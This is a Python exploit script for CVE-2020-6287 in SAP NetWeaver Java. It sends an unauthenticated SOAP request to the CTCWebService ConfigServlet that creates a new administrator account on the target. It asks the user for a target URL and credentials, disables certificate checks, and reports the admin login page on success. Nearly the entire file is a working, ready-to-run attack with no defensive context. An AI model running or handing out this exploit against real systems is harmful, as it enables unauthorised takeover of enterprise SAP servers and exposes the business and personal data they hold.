import requests
import base64

def create_sap_admin_user(target_url, username, password):
    """
    SAP Java Admin User Creation via CVE-2020-6287.
    """
    try:
        config_servlet_url = f"{target_url}/CTCWebService/CTCWebServiceBean/ConfigServlet"
        
        headers = {
            "Content-Type": "text/xml;charset=UTF-8",
            "User-Agent": "Mozilla/5.0"
        }

        payload = f"""
        <root>
            <user>
                <JavaOrABAP>java</JavaOrABAP>
                <username>{username}</username>
                <password>{password}</password>
                <userType></userType>
            </user>
        </root>
        """
        
        encoded_payload = base64.b64encode(payload.encode()).decode()

        soap_data = f"""
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:urn="urn:CTCWebServiceSi">
            <soapenv:Header/>
            <soapenv:Body>
                <urn:executeSynchronious>
                    <identifier>
                        <component>sap.com/tc~lm~config~content</component>
                        <path>content/Netweaver/ASJava/NWA/SPC/SPC_UserManagement.cproc</path>
                    </identifier>
                    <contextMessages>
                        <baData>{encoded_payload}</baData>
                        <name>userDetails</name>
                    </contextMessages>
                </urn:executeSynchronious>
            </soapenv:Body>
        </soapenv:Envelope>
        """
        
        response = requests.post(config_servlet_url, headers=headers, data=soap_data, verify=False, timeout=10)
        
        if response.status_code == 200 and "urn:CTCWebServiceSi" in response.text:
            print(f"[+] Successfully created SAP Java Administrator user:\nUsername: {username}\nPassword: {password}")
            print(f"[+] Login URL: {target_url}/nwa")
        else:
            print("[-] Failed to create user. The target might be patched or not vulnerable.")
    except Exception as e:
        print(f"[-] An error occurred: {e}")


if __name__ == "__main__":
    target = input("Enter the target URL (e.g., https://example.com): ").strip()
    admin_user = input("Enter the username for the new admin user: ").strip()
    admin_pass = input("Enter the password for the new admin user: ").strip()

    create_sap_admin_user(target, admin_user, admin_pass)
